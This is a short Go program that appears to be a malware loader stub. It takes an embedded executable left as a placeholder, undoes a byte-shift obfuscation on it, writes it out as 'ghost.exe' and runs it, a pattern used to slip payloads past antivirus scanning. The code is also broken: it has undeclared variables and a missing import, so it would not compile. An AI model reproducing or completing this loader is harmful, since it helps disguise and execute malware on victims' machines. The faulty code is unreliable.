package main

import "os/exec"

func main() {
	exe = <exehere>
	for index, currbyte := range exe {
		exe[index] = byte((int(currbyte) + (256 - index)) % 256)
	}
	runner = ioutil.WriteFile("ghost.exe", exe, 0777)
	command = exec.Command("./ghost.exe")
	command.Run()
}
